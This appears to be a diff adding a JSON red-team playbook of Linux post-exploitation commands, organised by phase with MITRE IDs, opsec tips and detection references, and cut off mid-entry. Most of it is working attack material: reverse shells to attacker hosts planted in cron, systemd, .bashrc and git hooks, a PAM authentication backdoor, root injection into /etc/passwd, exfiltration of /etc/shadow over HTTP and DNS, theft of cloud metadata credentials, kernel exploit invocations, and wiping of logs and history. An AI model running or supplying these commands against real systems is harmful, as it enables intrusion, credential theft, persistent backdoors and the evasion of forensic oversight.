@@ -1,0 +1,1305 @@
+{
+  "initial_enum": {
+    "description": "Initial system and network enumeration on a compromised Linux host.",
+    "commands": [
+      {
+        "description": "Identify current user and privileges.",
+        "method": "shell",
+        "command": "id && whoami && groups"
+      },
+      {
+        "description": "List all users on the system.",
+        "method": "shell",
+        "command": "cat /etc/passwd | grep -v nologin | grep -v false"
+      },
+      {
+        "description": "Check sudo permissions for current user.",
+        "method": "shell",
+        "command": "sudo -l"
+      },
+      {
+        "description": "Enumerate running processes.",
+        "method": "shell",
+        "command": "ps aux --forest"
+      },
+      {
+        "description": "List network interfaces and routes.",
+        "method": "shell",
+        "command": "ip a && ip route"
+      },
+      {
+        "description": "List open ports and listening services.",
+        "method": "shell",
+        "command": "ss -tlnup"
+      },
+      {
+        "description": "Check active network connections.",
+        "method": "shell",
+        "command": "netstat -antp 2>/dev/null || ss -antp"
+      },
+      {
+        "description": "Identify OS version and kernel.",
+        "method": "shell",
+        "command": "uname -a && cat /etc/os-release"
+      },
+      {
+        "description": "List installed packages (Debian/Ubuntu).",
+        "method": "shell",
+        "command": "dpkg -l"
+      },
+      {
+        "description": "List installed packages (RHEL/CentOS).",
+        "method": "shell",
+        "command": "rpm -qa"
+      },
+      {
+        "description": "Check bash command history.",
+        "method": "shell",
+        "command": "history"
+      },
+      {
+        "description": "Check SSH keys for current user.",
+        "method": "shell",
+        "command": "ls -l ~/.ssh"
+      },
+      {
+        "description": "Check for unmounted file systems or drives.",
+        "method": "shell",
+        "command": "lsblk"
+      },
+      {
+        "description": "Find world-writable directories.",
+        "method": "shell",
+        "command": "find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null"
+      },
+      {
+        "description": "Find world-writable files.",
+        "method": "shell",
+        "command": "find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null"
+      },
+      {
+        "description": "Check installed screen version (privesc candidate).",
+        "method": "shell",
+        "command": "screen -v"
+      },
+      {
+        "description": "View running processes with pspy (no root).",
+        "method": "pspy",
+        "command": "./pspy64 -pf -i 1000"
+      },
+      {
+        "description": "Find SUID binaries.",
+        "method": "shell",
+        "command": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null"
+      },
+      {
+        "description": "Find SETGID binaries.",
+        "method": "shell",
+        "command": "find / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null"
+      },
+      {
+        "description": "Search for config files.",
+        "method": "shell",
+        "command": "find / ! -path '*/proc/*' -iname '*config*' -type f 2>/dev/null"
+      },
+      {
+        "description": "Check current user PATH variable.",
+        "method": "shell",
+        "command": "echo $PATH"
+      },
+      {
+        "description": "Perform system audit with Lynis.",
+        "method": "Lynis",
+        "command": "./lynis audit system"
+      }
+    ],
+    "mitre": "T1082",
+    "prerequisites": "Any shell; standard Linux utilities",
+    "opsec": "Run linPEAS via curl | sh to avoid disk writes. Check sudo -l, SUID files, cron, and environment vars manually first.",
+    "detection_ref": "auditd for enumeration commands; osquery process monitoring; anomalous /etc/ access patterns"
+  },
+  "privilege_escalation": {
+    "description": "Techniques for escalating privileges to root on Linux systems.",
+    "commands": [
+      {
+        "description": "Find SUID binaries that can be abused.",
+        "method": "shell",
+        "command": "find / -perm -4000 -type f 2>/dev/null"
+      },
+      {
+        "description": "Find SGID binaries.",
+        "method": "shell",
+        "command": "find / -perm -2000 -type f 2>/dev/null"
+      },
+      {
+        "description": "Find world-writable files and directories.",
+        "method": "shell",
+        "command": "find / -writable -type f 2>/dev/null | grep -v proc"
+      },
+      {
+        "description": "Check for cron jobs and writable cron scripts.",
+        "method": "shell",
+        "command": "cat /etc/crontab && ls -la /etc/cron* && find /var/spool/cron -type f 2>/dev/null"
+      },
+      {
+        "description": "Check for sudo NOPASSWD misconfigs.",
+        "method": "shell",
+        "command": "sudo -l | grep NOPASSWD"
+      },
+      {
+        "description": "Automated privesc enumeration with LinPEAS.",
+        "method": "LinPEAS",
+        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash"
+      },
+      {
+        "description": "Linux Smart Enumeration (LSE).",
+        "method": "LSE",
+        "command": "curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh | bash -s -- -l2"
+      },
+      {
+        "description": "Exploit writeable /etc/passwd for root account.",
+        "method": "shell",
+        "command": "echo 'hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash' >> /etc/passwd"
+      },
+      {
+        "description": "Exploit sudo vim for shell escape.",
+        "method": "GTFOBins",
+        "command": "sudo vim -c ':!/bin/bash'"
+      },
+      {
+        "description": "Exploit NFS no_root_squash for root shell.",
+        "method": "shell",
+        "command": "showmount -e {target} && mount -t nfs {target}:/ /mnt && cp /bin/bash /mnt/tmp && chmod +s /mnt/tmp/bash"
+      },
+      {
+        "description": "Exploit writable systemd service unit file.",
+        "method": "shell",
+        "command": "echo '[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' > /etc/systemd/system/{service}.service && systemctl daemon-reload && systemctl start {service}"
+      },
+      {
+        "description": "Abuse Python/Perl/Ruby with cap_setuid capability for instant root.",
+        "method": "shell",
+        "command": "# Find caps: getcap -r / 2>/dev/null | grep 'cap_setuid'\\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'  # if python3 has cap_setuid+ep"
+      },
+      {
+        "description": "Exploit D-Bus misconfiguration for privilege escalation.",
+        "method": "shell",
+        "command": "busctl list | grep -v ':' && gdbus call --system --dest {service_name} --object-path {path} --method {method} {args}"
+      },
+      {
+        "description": "Monitor running processes for cron/script paths using pspy.",
+        "method": "pspy",
+        "command": "curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy"
+      },
+      {
+        "description": "Exploit writable /etc/ld.so.conf.d/ for shared library injection.",
+        "method": "shell",
+        "command": "echo '/tmp' > /etc/ld.so.conf.d/evil.conf && ldconfig && # Place malicious .so in /tmp named after a library loaded by root process"
+      },
+      {
+        "description": "Priv esc via sudo tcpdump -z script injection.",
+        "method": "shell",
+        "command": "sudo /usr/sbin/tcpdump -ln -i {interface} -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root"
+      },
+      {
+        "description": "Add . to beginning of PATH for binary hijacking.",
+        "method": "shell",
+        "command": "PATH=.:${PATH}"
+      },
+      {
+        "description": "View shared objects required by a binary.",
+        "method": "shell",
+        "command": "ldd /bin/ls"
+      },
+      {
+        "description": "Escalate with LD_PRELOAD via sudo.",
+        "method": "shell",
+        "command": "sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart"
+      },
+      {
+        "description": "Check RUNPATH of a binary for library injection.",
+        "method": "shell",
+        "command": "readelf -d {binary} | grep PATH"
+      },
+      {
+        "description": "Compile shared library for RUNPATH hijack.",
+        "method": "shell",
+        "command": "gcc src.c -fPIC -shared -o /development/libshared.so"
+      }
+    ],
+    "mitre": "T1548.001",
+    "prerequisites": "Low-privilege shell; misconfigured SUID/sudo/cron/capability or exploitable kernel version",
+    "opsec": "SUID abuse leaves process execution artifacts. sudo -l enumeration generates auth log entry. Use linPEAS in memory only (curl | sh). Check for NOPASSWD sudo first.",
+    "detection_ref": "auditd SUID/SGID execution events; sudo log (/var/log/auth.log); AIDE file integrity monitoring for SUID changes"
+  },
+  "credential_hunting": {
+    "description": "Finding credentials stored on Linux systems.",
+    "commands": [
+      {
+        "description": "Search for passwords in config files.",
+        "method": "shell",
+        "command": "grep -r 'password\\|passwd\\|secret\\|api_key\\|token' /etc /home /var/www 2>/dev/null --include='*.conf' --include='*.env' --include='*.yml' --include='*.yaml' -l"
+      },
+      {
+        "description": "Find .env files across the system.",
+        "method": "shell",
+        "command": "find / -name '.env' -type f 2>/dev/null"
+      },
+      {
+        "description": "Dump bash history for all users.",
+        "method": "shell",
+        "command": "cat /home/*/.bash_history /root/.bash_history 2>/dev/null"
+      },
+      {
+        "description": "Extract SSH private keys.",
+        "method": "shell",
+        "command": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null"
+      },
+      {
+        "description": "Read /etc/shadow (requires root).",
+        "method": "shell",
+        "command": "cat /etc/shadow"
+      },
+      {
+        "description": "Find credentials in web app configs.",
+        "method": "shell",
+        "command": "find /var/www -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' 2>/dev/null | xargs grep -l 'password\\|DB_PASS' 2>/dev/null"
+      },
+      {
+        "description": "Search memory for cleartext passwords with LaZagne.",
+        "method": "LaZagne",
+        "command": "python3 laZagne.py all"
+      },
+      {
+        "description": "Extract cloud credentials from instance metadata (AWS).",
+        "method": "curl",
+        "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+      },
+      {
+        "description": "Extract cloud credentials from instance metadata (GCP).",
+        "method": "curl",
+        "command": "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+      },
+      {
+        "description": "Extract Linux GNOME keyring secrets (requires user session).",
+        "method": "secret-tool",
+        "command": "secret-tool search --all '' 2>/dev/null; python3 -c \"import secretstorage; bus=secretstorage.dbus_init(); col=secretstorage.get_default_collection(bus); [print(i.get_label(),i.get_secret()) for i in col.get_all_items()]\""
+      },
+      {
+        "description": "Find credentials in git repository configuration.",
+        "method": "shell",
+        "command": "find / -name '.git' -type d 2>/dev/null | xargs -I{} cat {}/../.git/config 2>/dev/null | grep -E 'url|user|pass'"
+      },
+      {
+        "description": "Dump AWS credentials from environment and config files.",
+        "method": "shell",
+        "command": "env | grep -E 'AWS_|ACCESS_KEY|SECRET' && cat ~/.aws/credentials ~/.aws/config 2>/dev/null && find / -name 'credentials' -path '*/.aws/*' 2>/dev/null | xargs cat"
+      }
+    ],
+    "mitre": "T1552.001",
+    "prerequisites": "Read access to files; low-privilege shell",
+    "opsec": "Check bash_history, .ssh/, config files, environment variables, and /tmp for credentials before using any tools. No binaries needed.",
+    "detection_ref": "File access monitoring for credential paths; auditd for /etc/shadow access; secret scanning in CI/CD"
+  },
+  "persistence": {
+    "description": "Establishing persistence on Linux systems.",
+    "commands": [
+      {
+        "description": "Add SSH authorized key for backdoor access.",
+        "method": "shell",
+        "command": "echo '{ssh_pub_key}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
+      },
+      {
+        "description": "Add cron reverse shell.",
+        "method": "shell",
+        "command": "echo '* * * * * root bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> /etc/crontab"
+      },
+      {
+        "description": "Create a SUID bash copy for root shell.",
+        "method": "shell",
+        "command": "cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash"
+      },
+      {
+        "description": "Install a rootkit-style systemd service.",
+        "method": "shell",
+        "command": "cat > /etc/systemd/system/sysupdate.service <<EOF\\n[Unit]\\nDescription=System Update\\n[Service]\\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\nEOF\\nsystemctl enable sysupdate && systemctl start sysupdate"
+      },
+      {
+        "description": "Modify /etc/ld.so.preload for library hijacking.",
+        "method": "shell",
+        "command": "echo '/tmp/malicious.so' > /etc/ld.so.preload"
+      },
+      {
+        "description": "PAM auth bypass backdoor — grants any password authentication success. MUST be removed after engagement.",
+        "method": "shell",
+        "command": "# PAM universal bypass (use single-quotes to prevent shell expansion)\necho 'auth sufficient pam_permit.so' | sudo tee -a /etc/pam.d/common-auth\n\n# Verify insertion\ngrep pam_permit /etc/pam.d/common-auth\n\n# CLEANUP CRITICAL: remove after engagement or all auth is bypassed\nsudo sed -i '/pam_permit.so/d' /etc/pam.d/common-auth"
+      },
+      {
+        "description": "Add Git hooks for persistence in developer environments.",
+        "method": "shell",
+        "command": "echo '#!/bin/bash\\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &' > $(git rev-parse --git-dir)/hooks/pre-commit && chmod +x $(git rev-parse --git-dir)/hooks/pre-commit"
+      },
+      {
+        "description": "Xterm/X11 display hijack for graphical session persistence.",
+        "method": "shell",
+        "command": "DISPLAY=:0 xterm &  # Spawn terminal in victim's X session if DISPLAY is accessible"
+      },
+      {
+        "description": "Inject into user's .profile/.bashrc for persistence on login.",
+        "method": "shell",
+        "command": "echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &' >> /home/{user}/.bashrc"
+      }
+    ],
+    "mitre": "T1098.004",
+    "prerequisites": "Write access to target persistence location; appropriate privileges for target mechanism",
+    "opsec": "Cron jobs and SSH authorized_keys are frequently audited. Use less-common persistence: LD_PRELOAD, /etc/ld.so.preload, PAC hooks, or systemd timers.",
+    "detection_ref": "auditd file write events on persistence locations; AIDE integrity monitoring; osquery for persistence mechanisms; cron job auditing"
+  },
+  "lateral_movement": {
+    "description": "Pivoting from a Linux host to other systems.",
+    "commands": [
+      {
+        "description": "SSH to another host using found private key.",
+        "method": "ssh",
+        "command": "ssh -i {key_file} {user}@{target}"
+      },
+      {
+        "description": "Dynamic SOCKS5 proxy via SSH for pivoting.",
+        "method": "ssh",
+        "command": "ssh -D 1080 -N -f {user}@{pivot_host}"
+      },
+      {
+        "description": "Port forward via SSH.",
+        "method": "ssh",
+        "command": "ssh -L {local_port}:{internal_host}:{remote_port} {user}@{pivot_host}"
+      },
+      {
+        "description": "Chisel TCP tunnel for pivoting.",
+        "method": "Chisel",
+        "command": "# Server: chisel server -p 8080 --reverse\\n# Client: chisel client {server}:8080 R:{local_port}:{target}:{target_port}"
+      },
+      {
+        "description": "Scan internal network via compromised host.",
+        "method": "nmap",
+        "command": "nmap -sn 192.168.{x}.0/24 --min-rate 5000 2>/dev/null | grep 'Nmap scan report'"
+      },
+      {
+        "description": "socat TCP relay for pivoting without SSH.",
+        "method": "socat",
+        "command": "socat TCP-LISTEN:{local_port},fork TCP:{target}:{target_port} &"
+      },
+      {
+        "description": "Reverse tunnel via reGeorg for HTTP-based SOCKS proxy.",
+        "method": "reGeorg",
+        "command": "# Upload tunnel.php/aspx to webshell on pivot host\\npython3 reGeorgSocksProxy.py -p 1080 -u http://{pivot_host}/tunnel.php"
+      },
+      {
+        "description": "Use existing RDP/VNC sessions for hop without credentials.",
+        "method": "shell",
+        "command": "# Find open X/VNC displays: for i in $(seq 0 9); do xdpyinfo -display :$i 2>/dev/null && echo ':$i is open'; done"
+      }
+    ],
+    "mitre": "T1021",
+    "prerequisites": "SSH keys, credentials, or SSRF to reach adjacent systems; network connectivity",
+    "opsec": "SSH agent forwarding steals stored keys — use ProxyJump instead for operational security. Pass harvested keys through in-memory ssh-agent.",
+    "detection_ref": "SSH session logging (/var/log/auth.log); SIEM correlation of lateral movement patterns; host-based IDS for unusual SSH connections"
+  },
+  "data_exfiltration": {
+    "description": "Exfiltrating data from a compromised Linux system.",
+    "commands": [
+      {
+        "description": "Exfil data via curl to attacker server.",
+        "method": "curl",
+        "command": "tar czf - /home /etc/shadow /var/www | curl -X POST -F 'file=@-' http://{lhost}:{lport}/upload"
+      },
+      {
+        "description": "Exfil via DNS (base64 chunks).",
+        "method": "shell",
+        "command": "cat {file} | base64 | xargs -I{} sh -c 'dig {}.{attacker_domain} A'"
+      },
+      {
+        "description": "SCP sensitive files to attacker.",
+        "method": "scp",
+        "command": "scp -i {key} /etc/shadow {user}@{lhost}:/loot/"
+      },
+      {
+        "description": "Exfil via ICMP (ping tunnel).",
+        "method": "ptunnel",
+        "command": "ptunnel -p {relay_host} -lp {local_port} -da {dest} -dp {dest_port}"
+      }
+    ],
+    "mitre": "T1041",
+    "prerequisites": "Access to sensitive data; outbound connectivity; transfer mechanism available",
+    "opsec": "Compress and encrypt data before exfil. Use allowed protocols (HTTPS, DNS). Avoid large single transfers — use small chunks with delays.",
+    "detection_ref": "DLP tools; network egress monitoring; unusual outbound connection destinations; data volume anomalies"
+  },
+  "container_breakout": {
+    "description": "Escaping from restricted Linux environments and containers.",
+    "commands": [
+      {
+        "description": "Check Linux capabilities assigned to current process.",
+        "method": "shell",
+        "command": "capsh --print; cat /proc/self/status | grep CapEff; capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')"
+      },
+      {
+        "description": "Escape restricted shell via awk.",
+        "method": "GTFOBins",
+        "command": "awk 'BEGIN {system(\"/bin/bash\")}'"
+      },
+      {
+        "description": "Escape restricted shell via vi/vim.",
+        "method": "GTFOBins",
+        "command": "vi -c ':!/bin/bash'"
+      },
+      {
+        "description": "Abuse CAP_NET_ADMIN for packet injection.",
+        "method": "shell",
+        "command": "# With CAP_NET_ADMIN: ip link set eth0 promisc on && tcpdump -i eth0 -w /tmp/capture.pcap"
+      }
+    ],
+    "mitre": "T1611",
+    "prerequisites": "Container with CAP_SYS_ADMIN, privileged flag, or Docker socket mounted",
+    "opsec": "Privileged escape via /proc/1/root is fast and reliable. Verify container environment first with env and mount.",
+    "detection_ref": "Falco container escape detection; seccomp/AppArmor profiles; privileged container policy enforcement"
+  },
+  "kernel_exploits": {
+    "description": "Identifying and exploiting Linux kernel vulnerabilities for privilege escalation.",
+    "commands": [
+      {
+        "description": "Check kernel version for known vulns.",
+        "method": "shell",
+        "command": "uname -r && searchsploit linux kernel $(uname -r | cut -d- -f1)"
+      },
+      {
+        "description": "Exploit Dirty Cow (CVE-2016-5195) — race condition in copy-on-write. Note: DirtyCow (CVE-2016-5195) targets kernel < 4.8 — legacy systems only. Verify kernel version before attempting.",
+        "method": "exploit",
+        "command": "# Download dirtycow.c: gcc -pthread dirty.c -o dirty -lcrypt && ./dirty {new_root_pass}"
+      },
+      {
+        "description": "Exploit Dirty Pipe (CVE-2022-0847) — overwrite read-only files.",
+        "method": "exploit",
+        "command": "# CVE-2022-0847 affects kernel 5.8-5.16.11: ./dirtypipe /etc/passwd 1 '${your_line}'"
+      },
+      {
+        "description": "Exploit OverlayFS (CVE-2023-0386) for privilege escalation.",
+        "method": "exploit",
+        "command": "# Clone https://github.com/xkaneiki/CVE-2023-0386 && make && ./exp"
+      },
+      {
+        "description": "Check for exploitable kernel modules with kmodkit.",
+        "method": "shell",
+        "command": "lsmod && cat /proc/modules | awk '{print $1}' | xargs -I{} modinfo {} 2>/dev/null | grep -E 'version|filename'"
+      },
+      {
+        "description": "Exploit Polkit pkexec (CVE-2021-4034 PwnKit) — local root on any Linux with polkit.",
+        "method": "exploit",
+        "command": "# Check: dpkg -l policykit-1 | grep -E '0\\.(10[0-5]|[0-9]{1,2})\\.'; PoC: git clone https://github.com/ly4k/PwnKit && cd PwnKit && make && ./PwnKit"
+      },
+      {
+        "description": "Exploit GameOver(lay) OverlayFS (CVE-2023-2640 / CVE-2023-32629) — Ubuntu local privesc.",
+        "method": "exploit",
+        "command": "unshare -rm sh -c 'mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay o -olowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c \"import os; os.setuid(0); os.system(\\\"id\\\")\"'"
+      },
+      {
+        "description": "Exploit nf_tables OOB write (CVE-2022-1015/1016) — local privilege escalation via netfilter.",
+        "method": "exploit",
+        "command": "# Affects kernel 5.4-5.6.16: compile and run PoC from exploit-db or github.com/pqlx/CVE-2022-1015"
+      },
+      {
+        "description": "Use linux-exploit-suggester to identify viable kernel exploits.",
+        "method": "shell",
+        "command": "curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash"
+      }
+    ],
+    "mitre": "T1068",
+    "prerequisites": "Vulnerable kernel version; compiler available or exploit binary compatible",
+    "opsec": "Kernel exploits are noisy and can cause system instability. Verify kernel version and distro before attempting. Test in equivalent lab environment first.",
+    "detection_ref": "Kernel version patching; exploit mitigation (SMEP, SMAP, KASLR); auditd syscall monitoring; kernel module audit"
+  },
+  "ebpf_attacks": {
+    "description": "Abusing eBPF for privilege escalation, rootkits, and network interception.",
+    "mitre": "T1059.004",
+    "commands": [
+      {
+        "description": "Check eBPF capabilities and unprivileged eBPF status.",
+        "method": "shell",
+        "command": "sysctl kernel.unprivileged_bpf_disabled; cat /proc/sys/kernel/unprivileged_bpf_disabled"
+      },
+      {
+        "description": "Exploit CVE-2021-3490 — eBPF ALU32 bounds tracking OOB for local root.",
+        "method": "exploit",
+        "command": "# Affects kernel 5.7-5.11: PoC available at github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490"
+      },
+      {
+        "description": "Deploy eBPF-based rootkit for process and file hiding (Pamspy/bad-bpf).",
+        "method": "shell",
+        "command": "# Clone https://github.com/pathtofile/bad-bpf && make && ./pidhide -p {target_pid}"
+      },
+      {
+        "description": "Intercept SSH passwords via eBPF uprobe on libssl (PAMspy).",
+        "method": "shell",
+        "command": "# Clone https://github.com/citronneur/pamspy && cargo build --release && sudo ./target/release/pamspy -p $(which sshd)"
+      },
+      {
+        "description": "Sniff all network packets via eBPF XDP program (no tcpdump needed).",
+        "method": "shell",
+        "command": "# bpftrace -e 'tracepoint:net:napi_gro_receive_entry { printf(\"%s\\n\", str(args->data)); }'"
+      }
+    ],
+    "prerequisites": "Root or CAP_BPF capability; BPF tools available; kernel ≥ 4.9 for XDP",
+    "opsec": "eBPF programs are loaded into kernel — require root or CAP_BPF. Very stealthy for monitoring/hooking. No disk artifacts for in-memory programs.",
+    "detection_ref": "eBPF program audit (bpftool prog list); kernel lockdown mode; CAP_BPF capability restriction; runtime eBPF monitoring"
+  },
+  "service_account_abuse": {
+    "description": "Abusing service accounts, sudo misconfiguration, and privileged processes on Linux.",
+    "commands": [
+      {
+        "description": "Find processes running as root with writable binaries.",
+        "method": "shell",
+        "command": "ps aux | awk '$1==\"root\" {print $11}' | while read bin; do ls -la $bin 2>/dev/null | grep -v '^-r' && echo $bin; done"
+      },
+      {
+        "description": "Abuse sudo with env_keep to hijack LD_PRELOAD.",
+        "method": "shell",
+        "command": "# If sudo allows env_keep+=LD_PRELOAD: echo 'void _init(){setuid(0);setgid(0);system(\"/bin/bash\");}' > /tmp/evil.c && gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c && sudo LD_PRELOAD=/tmp/evil.so {allowed_command}"
+      },
+      {
+        "description": "Exploit sudo version — CVE-2021-3156 Baron Samedit (sudo < 1.9.5p2).",
+        "method": "exploit",
+        "command": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')"
+      },
+      {
+        "description": "Find services running as root with writable config files.",
+        "method": "shell",
+        "command": "systemctl list-units --type=service --state=running | awk '{print $1}' | xargs -I{} systemctl show {} -p ExecStart,User | grep -A1 'User=root'"
+      },
+      {
+        "description": "Exploit PATH hijacking in root-owned scripts.",
+        "method": "shell",
+        "command": "# Find script calling command without full path: echo '/bin/bash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH && sudo {vulnerable_script}"
+      }
+    ],
+    "mitre": "T1548.003",
+    "prerequisites": "Service account credentials (file, environment variable, or metadata service); associated permissions",
+    "opsec": "Service account keys in application directories and environment variables. Check /var/run/secrets/ in containers. No tools required for initial access.",
+    "detection_ref": "Service account key rotation monitoring; least-privilege service account enforcement; credential monitoring in deployment configs"
+  },
+  "linux_network_pivot": {
+    "description": "Advanced Linux pivoting and tunneling techniques.",
+    "commands": [
+      {
+        "description": "Full network pivot with ligolo-ng agent.",
+        "method": "ligolo-ng",
+        "command": "# Attacker: ./proxy -selfcert -laddr 0.0.0.0:11601\\n# Target: ./agent -connect {attacker}:11601 -ignore-cert"
+      },
+      {
+        "description": "DNS-over-HTTPS tunnel for C2 (iodine).",
+        "method": "iodine",
+        "command": "# Server: iodined -f 10.0.0.1 {attacker_domain}\\n# Client: iodine -f {attacker_ip} {attacker_domain}"
+      },
+      {
+        "description": "Reverse port forward via SSH with -R flag.",
+        "method": "ssh",
+        "command": "ssh -R {attacker_port}:{internal_host}:{internal_port} {user}@{attacker_ip}"
+      },
+      {
+        "description": "SOCKS5 via SSH with ProxyChains for lateral movement.",
+        "method": "shell",
+        "command": "ssh -D 9050 -N -f {user}@{jump_host} && proxychains nmap -sT {internal_target}"
+      },
+      {
+        "description": "Netcat relay for traffic forwarding without SSH.",
+        "method": "shell",
+        "command": "mkfifo /tmp/pipe && nc -lp {local_port} < /tmp/pipe | nc {target} {target_port} > /tmp/pipe"
+      }
+    ],
+    "mitre": "T1090",
+    "prerequisites": "Network access from compromise host; pivoting tools (socat, ssh, chisel)",
+    "opsec": "SSH port forwarding is encrypted and blends with legitimate SSH. Chisel/socat for non-SSH environments. Use existing allowed protocols for tunneling.",
+    "detection_ref": "Network connection monitoring; SSH forwarding detection; unusual listener port creation; auditd network socket events"
+  },
+  "memory_forensics_evasion": {
+    "description": "Manipulating Linux memory and process artifacts to hinder forensic analysis.",
+    "commands": [
+      {
+        "description": "Hide process by overwriting /proc/self/comm.",
+        "method": "shell",
+        "command": "echo -ne 'sshd\\x00' > /proc/self/comm"
+      },
+      {
+        "description": "Delete binary after execution (runs from memory).",
+        "method": "shell",
+        "command": "cp /tmp/payload /tmp/.hidden; exec /tmp/.hidden & rm -f /tmp/.hidden"
+      },
+      {
+        "description": "Clear bash history immediately and disable for session.",
+        "method": "shell",
+        "command": "unset HISTFILE; export HISTSIZE=0; history -c; rm -f ~/.bash_history"
+      },
+      {
+        "description": "Wipe utmp/wtmp login records to hide active session.",
+        "method": "shell",
+        "command": "utmpdump /var/run/utmp | grep -v '{username}' | utmpdump -r > /tmp/utmp.clean && cp /tmp/utmp.clean /var/run/utmp && utmpdump /var/log/wtmp | grep -v '{username}' | utmpdump -r > /tmp/wtmp.clean && cp /tmp/wtmp.clean /var/log/wtmp"
+      },
+      {
+        "description": "Use memfd_create for fileless payload execution.",
+        "method": "Python",
+        "command": "python3 -c \"import ctypes,os; fd=ctypes.CDLL(None).memfd_create('anon',1); os.write(fd,open('/tmp/payload','rb').read()); os.execve(f'/proc/{os.getpid()}/fd/{fd}',['payload'],os.environ)\""
+      }
+    ],
+    "mitre": "T1070.003",
+    "prerequisites": "Shell access; ability to execute commands",
+    "opsec": "Clear bash history (history -c). Use HISTFILE=/dev/null for current session. Shred or rm -P sensitive files. Overwrite command names with space prefix.",
+    "detection_ref": "auditd HISTFILE manipulation; process execution logging without relying on history; Sysmon-equivalent for Linux; osquery process auditing"
+  },
+  "supply_chain_linux": {
+    "description": "Supply chain attacks targeting Linux package managers and build systems.",
+    "mitre": "T1195.002",
+    "commands": [
+      {
+        "description": "Audit installed packages for known vulnerable versions.",
+        "method": "shell",
+        "command": "dpkg -l | awk 'NR>5{print $2,$3}' | while read pkg ver; do searchsploit $pkg $ver 2>/dev/null | grep -v 'No Results'; done"
+      },
+      {
+        "description": "Check for pip packages installed from untrusted sources.",
+        "method": "shell",
+        "command": "pip3 show $(pip3 list --format=columns | awk 'NR>2{print $1}') 2>/dev/null | grep -E 'Location|Home-page' | grep -v 'pypi.org'"
+      },
+      {
+        "description": "Audit npm global packages for typosquatting.",
+        "method": "shell",
+        "command": "npm list -g --depth=0 2>/dev/null | awk '{print $2}' | cut -d@ -f1 | sort"
+      },
+      {
+        "description": "Find packages installed outside package manager (manual installs).",
+        "method": "shell",
+        "command": "find /usr/local/bin /opt -type f -executable 2>/dev/null | xargs -I{} sh -c 'dpkg -S {} 2>&1 | grep \"no path found\" && echo {}'"
+      },
+      {
+        "description": "Check for compromised apt sources or modified repo signing keys.",
+        "method": "shell",
+        "command": "cat /etc/apt/sources.list /etc/apt/sources.list.d/*.list 2>/dev/null && apt-key list 2>/dev/null"
+      }
+    ],
+    "prerequisites": "Access to package/software supply chain; ability to inject into build or distribution pipeline",
+    "opsec": "Supply chain attacks have delayed execution and wide blast radius. Typosquatting on PyPI/npm requires registering lookalike package names in advance.",
+    "detection_ref": "Package signature verification; pinned dependency hashes in requirements.txt; SBOM generation; SCA scanning in CI/CD; dependency confusion prevention"
+  },
+  "proc_filesystem": {
+    "description": "Advanced use of /proc filesystem for information gathering and attack primitives.",
+    "mitre": "T1057",
+    "commands": [
+      {
+        "description": "Read environment variables of any process (requires same UID or root).",
+        "method": "shell",
+        "command": "cat /proc/{pid}/environ | tr '\\0' '\\n'  # Find PIDs with: ls /proc | grep '^[0-9]'"
+      },
+      {
+        "description": "Dump memory maps of a target process.",
+        "method": "shell",
+        "command": "cat /proc/{pid}/maps && cat /proc/{pid}/smaps"
+      },
+      {
+        "description": "Read file descriptors of a running process.",
+        "method": "shell",
+        "command": "ls -la /proc/{pid}/fd && cat /proc/{pid}/fdinfo/{fd_num}"
+      },
+      {
+        "description": "Steal file descriptor contents from another process (same user).",
+        "method": "shell",
+        "command": "cat /proc/{pid}/fd/{fd_number}  # Can read open files, sockets, pipes of target process"
+      },
+      {
+        "description": "Check process memory for credentials via /proc/pid/mem.",
+        "method": "Python",
+        "command": "# Open /proc/{pid}/maps, parse heap segment, read /proc/{pid}/mem at heap offset, search for 'password'|'token'"
+      }
+    ],
+    "prerequisites": "Any user; /proc accessible (default on all Linux)",
+    "opsec": "/proc/self/mem for process memory reading without ptrace (no audit events). /proc/*/environ for credential discovery. /proc/*/cmdline for process history.",
+    "detection_ref": "auditd for /proc/*/mem access; inotify on critical /proc paths; container security profiles blocking /proc access"
+  },
+  "linux_ad_integration": {
+    "description": "Attacking Linux hosts joined to Active Directory via SSSD/Winbind.",
+    "mitre": "T1078.002",
+    "commands": [
+      {
+        "description": "Check if Linux host is domain-joined.",
+        "method": "shell",
+        "command": "realm list; sssd --version; wbinfo --ping-dc 2>/dev/null; klist -k /etc/krb5.keytab"
+      },
+      {
+        "description": "Dump Kerberos keytab from SSSD-joined Linux host.",
+        "method": "shell",
